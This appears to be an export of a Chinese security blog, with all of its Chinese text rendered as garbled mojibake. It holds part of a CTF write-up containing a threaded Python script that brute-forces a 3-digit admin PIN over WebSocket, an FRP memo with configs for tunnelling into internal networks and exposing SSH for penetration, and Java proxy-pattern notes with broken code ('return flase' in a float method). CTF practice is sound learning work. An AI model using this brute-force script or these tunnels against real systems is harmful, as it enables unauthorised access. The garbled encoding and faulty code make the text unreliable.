<p>ä¸Šé¢å¯ä»¥è·¨åŸŸ ä½†æ˜¯çœŸæ­£èƒ½ä¸èƒ½è¯·æ±‚æˆåŠŸéœ€è¦çœ‹æœåŠ¡ç«¯çš„Access-Control-Allow-Originï¼ˆå…è®¸çš„è·¨åŸŸè¯·æ±‚åŸŸåï¼‰å’ŒAccess-Control-Allow-Methodsï¼ˆå…è®¸çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ï¼‰ä¸¤ä¸ªå­—æ®µçš„è§„åˆ™<br>ç”±äºæ­¤é¢˜ç›®çš„Originæ˜¯file:&#x2F;&#x2F; æ‰€ä»¥æ­¤å¤„ç¬¦åˆåŒæºç­–ç•¥å¯ç›´æ¥è¯»å–ã€‚</p>
<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>jsonpè·¨åŸŸå°±æ˜¯æŠŠæƒ³è¦è·¨åŸŸçš„å†…å®¹ç›´æ¥å½“ä½œjsè¯·æ±‚è¿”å›ï¼Œä¼—æ‰€å‘¨çŸ¥</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxxx.com/dsadsa.js</span>&gt;</span>æ ‡ç­¾æ˜¯å¯ä»¥è·¨åŸŸçš„</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¸€èˆ¬ä¸å¥½åˆ©ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œä½†æ˜¯ä»–ä¹Ÿå­˜åœ¨ä¸€äº›å…¶ä»–çš„å®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªä»¥åå†è¯´ã€‚</p>
<h2 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h2><p>æ‰“å¼€é¢˜ç›®å°±æ˜¯ä¸€ä¸ªç½‘ç«™å±•ç¤ºé¡µ</p>
<p><img data-src="/images/pages/image-20220328212136142.png" alt="image-20220328212136142"></p>
<p>å…¶ä¸­login urlæœ‰ä¸€ä¸ªç™»å½•ç«¯å£</p>
<p><img data-src="/images/pages/image-20220328212202236.png" alt="image-20220328212202236"></p>
<p>è¾“å…¥é”™è¯¯çš„ç”¨æˆ·åä¼šæç¤ºç”¨æˆ·åä¸å­˜åœ¨ï¼Œå¦‚æœæ˜¯æ­£ç¡®çš„åˆ™æ˜¯pinä¸æ­£ç¡®ï¼Œæ‰€ä»¥åŸºäºæ­¤å¯ä»¥ç¡®å®šç”¨æˆ·åadminï¼Œç„¶åF12æŸ¥çœ‹æºç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;topbox&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can&#x27;t remember jack --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;PIN&quot;</span> <span class="attr">required</span> <span class="attr">pattern</span>=<span class="string">&quot;(\d&#123;3&#125;|\d&#123;16&#125;)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥æ™“æ˜¯ä¸‰ä½æ•°å­—çˆ†ç ´ï¼Œä½†æ˜¯è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯websoketçˆ†ç ´ï¼Œå› ä¸ºé€šä¿¡æ˜¯websocketåè®®</p>
<p>æˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;ws://web1.utctf.live:8651/internal/ws&#x27;</span></span><br><span class="line">PINLENGTH = <span class="number">3</span></span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">tryLoginWith</span>(<span class="params">pin</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(URL) <span class="keyword">as</span> websocket:</span><br><span class="line">        begin = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">if</span> begin == <span class="string">&#x27;begin&#x27;</span>:</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;begin&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;user <span class="subst">&#123;USERNAME&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;pass <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            data = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[&lt;&lt;&lt;] Data: <span class="subst">&#123;data&#125;</span> | Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-] Wrong Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">args</span>):</span><br><span class="line">    asyncio.run(tryLoginWith(<span class="built_in">str</span>(args).zfill(PINLENGTH)))</span><br><span class="line"></span><br><span class="line">args = [ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) ]</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">100</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    pool.<span class="built_in">map</span>(send,args)</span><br></pre></td></tr></table></figure>

<p>ç™»å½•å³å¯è·å–flag</p>
<h2 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h2><p>è¿™é“é¢˜ç›®çš„è€ƒç‚¹å…¶å®å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯è¦è¿ç»­æ­£ç¡®è¯†åˆ«1000ä¸ªéªŒè¯ç ã€‚</p>
<p>é¦–å…ˆæµ‹è¯•å¯ä»¥å¾—çŸ¥æ¯ä¸ªcookieéƒ½å¯¹åº”äº†ä¸€ä¸ªéªŒè¯ç ï¼Œä¸”è®°å½•äº†æ­£ç¡®çš„æ¬¡æ•°ï¼Œè¿™å¯ä»¥ä¿è¯æˆ‘ä»¬å³ä½¿è¯†åˆ«é”™è¯¯ä¾ç„¶å¯ä»¥å›é€€åˆ°ä¸Šä¸€ä¸ªéªŒè¯ç çš„cookieï¼Œä¸å¿…ä»å¤´å¼€å§‹ã€‚è‡³äºéªŒè¯ç è¯†åˆ«æˆ‘å¸¸ç”¨çš„æ˜¯muggleæ¨¡å—ï¼Œä½†æ˜¯éªŒè¯ç è¿‡äºå¤æ‚ï¼Œæ— æ³•è¯†åˆ«ï¼Œæ­¤å¤„éœ€è¦è¿‡æ»¤å™ªéŸ³ã€‚æˆ‘ä¸€ä¸ªåŒäº‹å‘ç°æ­¤éªŒè¯ç çš„èƒŒæ™¯å›¾ç‰‡å‡ ä¹ä¸€è‡´ï¼Œå¦‚æœæˆ‘ä»¬æŠŠèƒŒæ™¯å›¾ç‰‡æŠ å‡ºæ¥ç„¶åå†xorå°±èƒ½æ‹¿åˆ°çº¯éªŒè¯ç çš„å›¾ç‰‡ï¼Œç„¶åå†muggleè¯†åˆ«å°±okäº†ã€‚</p>
<p>æœ€åæˆ‘ä»¬æŠ å‡ºå¦‚å›¾</p>
<p><img data-src="/images/pages/image-20220328213232959.png" alt="image-20220328213232959"></p>
<p>å°½ç®¡xoråçš„å›¾ç‰‡ä»ç„¶å¯èƒ½æ¯”è¾ƒæ¨¡ç³Š ä½†æ˜¯æ­£ç¡®ç‡å·²ç»è¶³å¤Ÿ</p>
<p>æœ€ç»ˆæˆ‘ä»¬è·å¾—äº†flag</p>
<p>ç½‘ä¸Šåˆ«çš„wpç”¨çš„python ocræ˜¯ pytesseract è¿™ä¸ªå¤§å®¶å¯ä»¥åˆç†å‚è€ƒã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://juejin.cn/post/6913541999735881741">https://juejin.cn/post/6913541999735881741</a></li>
<li><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>FRPå¤‡å¿˜å½•</title>
    <url>//posts/frp_bak/</url>
    <content><![CDATA[<h1 id="frpå¸¸ç”¨åŠŸèƒ½"><a href="#frpå¸¸ç”¨åŠŸèƒ½" class="headerlink" title="frpå¸¸ç”¨åŠŸèƒ½"></a>frpå¸¸ç”¨åŠŸèƒ½</h1><h2 id="frpç©¿é€é…åˆProxifierå®ç°å†…ç½‘ç©¿é€"><a href="#frpç©¿é€é…åˆProxifierå®ç°å†…ç½‘ç©¿é€" class="headerlink" title="frpç©¿é€é…åˆProxifierå®ç°å†…ç½‘ç©¿é€"></a>frpç©¿é€é…åˆProxifierå®ç°å†…ç½‘ç©¿é€</h2><p>å†…ç½‘ç©¿é€å¸¸ç”¨ï¼Œä¸€èˆ¬ç”¨æ¥ç©¿é€å†…ç½‘è¿›è¡Œä¸‹ä¸€æ­¥çš„æ¸—é€ã€‚FRPåšä¸€å±‚ä¸¤å±‚ç©¿é€ç¡®å®æŒºå¥½ç”¨çš„ï¼Œå¤šå±‚ç©¿é€è¿˜æ˜¯ç›´æ¥msfæˆ–è€…npsæ›´æ–¹ä¾¿ä¸€ç‚¹ã€‚</p>
<p>æœåŠ¡ç«¯é…ç½®</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># å·¥ä½œå°é…ç½®ï¼Œä¸éœ€è¦å¯ä»¥ä¸é…ç½®</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>å®¢æˆ·ç«¯é…ç½®</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯åœ°å€</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">111.111</span>.<span class="number">111</span>.xxx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨socksæ’ä»¶å’ŒProxifierå·¥å…·å®ç°ä»£ç†åŠŸèƒ½</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin123</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†…ç½‘ç©¿é€åŠŸèƒ½  ssh 111.111.111.<span class="doctag">xxx:</span>6000</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure>

<p>nohupåå°è¿è¡Œï¼š<br>æœåŠ¡ç«¯ frps -c fops.ini<br>å®¢æˆ·ç«¯ frpc -c frcp.ini</p>
<p>é…åˆProxifier å³å¯ç›´æ¥ç©¿é€å†…ç½‘</p>
<h2 id="ç©¿é€å›ºå®šweb"><a href="#ç©¿é€å›ºå®šweb" class="headerlink" title="ç©¿é€å›ºå®šweb"></a>ç©¿é€å›ºå®šweb</h2><p>Frps.iniä¿®æ”¹å¦‚ä¸‹</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">8000</span></span><br><span class="line"><span class="comment"># ç”¨äºèº«ä»½éªŒè¯ï¼Œè¯·è‡ªè¡Œä¿®æ”¹</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br></pre></td></tr></table></figure>

<p>frpc.ini å¦‚ä¸‹</p>
<p>å‡è®¾ frps æ‰€åœ¨çš„æœåŠ¡å™¨çš„ IP ä¸º x.x.x.xï¼Œlocal_port ä¸ºæœ¬åœ°æœºå™¨ä¸Š Web æœåŠ¡å¯¹åº”çš„ç«¯å£ï¼Œ ç»‘å®šè‡ªå®šä¹‰åŸŸå <code>www.yourdomain.com</code></p>
<p>æ²¡æœ‰åŸŸåå°±ç›´æ¥ç»‘å®šip</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># ç”¨äºèº«ä»½éªŒè¯ï¼Œè¯·è‡ªè¡Œä¿®æ”¹</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span></span><br><span class="line"><span class="comment"># ipæˆ–è€…åŸŸåéƒ½å¯ä»¥</span></span><br><span class="line"><span class="attr">custom_domains</span> = www.xxxpass.com </span><br></pre></td></tr></table></figure>

<h2 id="ç©¿é€22-SSH"><a href="#ç©¿é€22-SSH" class="headerlink" title="ç©¿é€22 SSH"></a>ç©¿é€22 SSH</h2><p>frps.ini å¯ä»¥éšæ„åªè¦èƒ½å¯åŠ¨å°±è¡Œï¼Œè¿™é‡Œä¹Ÿè§£é‡Šä¸‹ å…¶å®å¼€å“ªä¸ªç«¯å£æ˜¯ç”±frpcç«¯æ§åˆ¶çš„</p>
<p>Frps.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># ç”¨äºèº«ä»½éªŒè¯ï¼Œè¯·è‡ªè¡Œä¿®æ”¹</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br></pre></td></tr></table></figure>

<p>frpc.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># ç”¨äºèº«ä»½éªŒè¯ï¼Œè¯·è‡ªè¡Œä¿®æ”¹ï¼Œè¦ä¿è¯æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¸€è‡´</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure>





<h2 id="åç»­å…¶ä»–å¤‡å¿˜å¾…è¡¥å……"><a href="#åç»­å…¶ä»–å¤‡å¿˜å¾…è¡¥å……" class="headerlink" title="åç»­å…¶ä»–å¤‡å¿˜å¾…è¡¥å……"></a>åç»­å…¶ä»–å¤‡å¿˜å¾…è¡¥å……</h2><p>â€¦â€¦â€¦â€¦</p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†</title>
    <url>//posts/Java-proxy/</url>
    <content><![CDATA[<h1 id="JavaåŠ¨æ€ä»£ç†"><a href="#JavaåŠ¨æ€ä»£ç†" class="headerlink" title="JavaåŠ¨æ€ä»£ç†"></a>JavaåŠ¨æ€ä»£ç†</h1><p>æœ€è¿‘åœ¨çœ‹javaçš„åŠ¨æ€ä»£ç†ï¼Œåšä¸‹ç¬”è®°</p>
<h2 id="ä»€ä¹ˆæ˜¯ä»£ç†"><a href="#ä»€ä¹ˆæ˜¯ä»£ç†" class="headerlink" title="ä»€ä¹ˆæ˜¯ä»£ç†"></a>ä»€ä¹ˆæ˜¯ä»£ç†</h2><p>ä»£è´­ï¼šå¦‚æœä½ æƒ³ä¹°çš„ä¸œè¥¿åœ¨å›½å¤–ï¼Œä½ ä¸€èˆ¬ä¸ä¼šé£è¿‡å»ä¹°å®Œå†é£å›æ¥ï¼Œè€Œæ˜¯æœ‰ä¸ªä¸­ä»‹ï¼Œå¸®ä½ å¤„ç†è¿™ä»¶äº‹ï¼Œè¿™ä¸ªä¸­ä»‹å°±æ˜¯ä»£è´­ï¼Œä¹Ÿå°±æ˜¯ä»£ç†ã€‚å¸®ä½ åŠä¸€ä»¶äº‹å°±æ˜¯ä»£ç†ã€‚</p>
<p>å®¢æˆ· â€”â€“ ä»£ç†ï¼ˆä»£è´­ï¼‰ â€”â€”å›½å¤–å•†åœº</p>
<p>ä¸ºä»€ä¹ˆæ‰¾ä»£è´­ï¼Ÿ</p>
<p>ä¾¿å®œçœå¿ƒä¸“ä¸šï¼Œæˆ‘ä¸èƒ½è‡ªå·±å»å›½å¤–ä¹°ã€‚åŒæ—¶ä»£è´­ä¸ºäº†è‡ªå·±çš„ä¼˜åŠ¿ï¼Œä¸è®©ä¹°å®¶æ¥è§¦è‡ªå·±çš„è¿›è´§æ¸ é“ï¼Œä½ æƒ³è¦è¿™ä¸ªä»·æ ¼å’ŒæœåŠ¡å°±åªèƒ½é€šè¿‡ä»£è´­ã€‚æ‰€ä»¥å¾ˆå¤šæ—¶å€™åªèƒ½é€šè¿‡ä»£è´­æ¥ä¹°ä¸œè¥¿ã€‚</p>
<span id="more"></span>

<h3 id="ç±»æ¯”åˆ°java"><a href="#ç±»æ¯”åˆ°java" class="headerlink" title="ç±»æ¯”åˆ°java"></a>ç±»æ¯”åˆ°java</h3><p>Aç±»æƒ³è°ƒç”¨Cç±»çš„æ–¹æ³•ï¼Œä½†æ˜¯Cä¸å…è®¸Aç›´æ¥è°ƒç”¨ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ä»£ç†Bæ¥è¿›è¡Œæ“ä½œã€‚</p>
<p>A-&gt;B-&gt;C  </p>
<p>C-&gt;B-&gt;A</p>
<p>çœ‹èµ·æ¥å¾ˆå‚»å¯¹ä¸å¯¹ï¼Ÿä½†æ˜¯æ˜¯å®é™…æƒ…å†µéœ€æ±‚ã€‚</p>
<p>æ¯”å¦‚ä»˜æ¬¾éœ€è¦çŸ­ä¿¡éªŒè¯ç ï¼Œä½ ä¸å¯èƒ½ç›´æ¥æ‰¾ç§»åŠ¨è”é€šè¯´å‘æ¡çŸ­ä¿¡ã€‚è€Œæ˜¯æ‰¾ç¬¬ä¸‰æ–¹å…¬å¸ï¼Œä»–ä»¬æ€»åŒ…äº†ä¸€ä¸ªå¤§ä¸šåŠ¡ï¼Œä¸€å¤©å‡ åä¸‡æ¡ç»™ç§»åŠ¨è”é€šç­¾åˆåŒã€‚ç„¶åä½ ä¹°ä»–ä»¬çš„ï¼Œä»–ä»¬å†ä»˜é’±ç»™ç§»åŠ¨è”é€šã€‚</p>
<h2 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h2><h3 id="ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼"><a href="#ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼" class="headerlink" title="ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼"></a>ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼</h3><p>Aç±»æƒ³è°ƒç”¨Cç±»çš„æ–¹æ³•ï¼Œä½†æ˜¯Cä¸å…è®¸Aç›´æ¥è°ƒç”¨ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ä»£ç†Bæ¥è¿›è¡Œæ“ä½œã€‚è¿™ç§ç¨‹åºçš„è°ƒç”¨å…³ç³»ç§°ä¸ºä»£ç†æ¨¡å¼ã€‚</p>
<h3 id="ä»£ç†æ¨¡å¼çš„ä½œç”¨"><a href="#ä»£ç†æ¨¡å¼çš„ä½œç”¨" class="headerlink" title="ä»£ç†æ¨¡å¼çš„ä½œç”¨"></a>ä»£ç†æ¨¡å¼çš„ä½œç”¨</h3><p>1ã€åŠŸèƒ½å¢å¼º ï¼šåœ¨åŸæœ‰åŠŸèƒ½ä¸Šå¢åŠ æ–°åŠŸèƒ½</p>
<p>2ã€æ§åˆ¶è®¿é—®  :  æ§åˆ¶ä½ ç›´æ¥è®¿é—®ç›®æ ‡</p>
<h3 id="å¦‚ä½•å®ç°ä»£ç†"><a href="#å¦‚ä½•å®ç°ä»£ç†" class="headerlink" title="å¦‚ä½•å®ç°ä»£ç†"></a>å¦‚ä½•å®ç°ä»£ç†</h3><h4 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h4><p>1ã€ä»£ç†ç±»æ‰‹åŠ¨å®ç°</p>
<p>2ã€ä»£ç†çš„ç›®æ ‡ç±»æ˜¯ç¡®å®šçš„</p>
<h5 id="å®ç°ä¸€ä¸ªé™æ€ä»£ç†"><a href="#å®ç°ä¸€ä¸ªé™æ€ä»£ç†" class="headerlink" title="å®ç°ä¸€ä¸ªé™æ€ä»£ç†"></a>å®ç°ä¸€ä¸ªé™æ€ä»£ç†</h5><p>1ã€åˆ›å»ºä¸€ä¸ªæ¥å£ï¼Œå®šä¹‰å–Uç›˜çš„æ–¹æ³•</p>
<p>2ã€åˆ›å»ºå‚å®¶ç±»ï¼Œå®ç°1æ­¥éª¤æ¥å£</p>
<p>3ã€åˆ›å»ºå•†å®¶ï¼Œå°±æ˜¯ä»£ç†å®ç°1æ­¥éª¤æ¥å£</p>
<p>4ã€å®šä¹‰å®¢æˆ·ç±»</p>
<p>å®šä¹‰UsbSellæ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//å‚å®¶å’Œå•†å®¶éƒ½è¦å®Œæˆçš„åŠŸèƒ½</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="comment">//è´­ä¹°çš„æ•°é‡ï¼Œè¿”å›uç›˜ä»·æ ¼</span></span><br><span class="line">  <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡‘å£«é¡¿å‚å®¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbKingFactory</span> <span class="keyword">implements</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>&#123;</span><br><span class="line">    <span class="comment">//ä¸€ä¸ªUç›˜85 10000èµ·å–</span></span><br><span class="line">    <span class="keyword">if</span> (amount &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> flase</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">85.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ·˜å®å•†å®¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaoBao</span> <span class="keyword">implements</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="keyword">private</span>  <span class="type">UsbKingFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbKingFactory</span>();</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>&#123;</span><br><span class="line">   	<span class="comment">//ä¸€ä¸ªæˆ‘å°±å–èµš25ï¼Œå¢å¼ºåŠŸèƒ½ï¼Œè€Œä¸”æˆ‘è¿˜å¯ä»¥å¢å¼ºå„ç§åŠŸèƒ½ï¼Œæ¯”å¦‚æˆ‘æ¢åŒ…è£…ï¼Œæˆ‘æ†ç»‘é”€å”®ã€‚æˆ‘å¥½è¯„è¿”ç°å•¥çš„ã€‚</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">price</span> <span class="operator">=</span> factory.sell(amount);</span><br><span class="line">    price = price + <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShopMain</span>&#123;</span><br><span class="line">  <span class="type">TaoBao</span> <span class="variable">taobao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TaoBao</span>();</span><br><span class="line">  <span class="type">float</span> <span class="variable">price</span> <span class="operator">=</span> taobao.sell(<span class="number">1</span>);</span><br><span class="line">  System.out.println(price);</span><br><span class="line">  <span class="comment">//å¯ä»¥è¯´æ˜¯è¢«å•†å®¶å‰¥å‰Šäº†</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»£ç†ç±»ä¸€èˆ¬éƒ½ ä¼šè°ƒç”¨ç›®æ ‡ç±»çš„æ–¹æ³•ï¼Œç„¶åé¢å¤–åšå…¶ä»–åŠŸèƒ½ã€‚</p>
<h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><p>1ã€å¦‚æœå‚å®¶ä¸æ­¢ä¸€å®¶ï¼Œå°±è¦åˆ›å»ºå„ç§å‚å®¶ç±»ï¼Œç„¶åä»£ç†å•†ä¹Ÿè¦è°ƒç”¨å„ç§å‚å®¶ç±»çš„æ–¹æ³•ã€‚æ‰€ä»¥ä»£ç†å•†ç±»ä¹Ÿæˆå€å¢é•¿ã€‚</p>
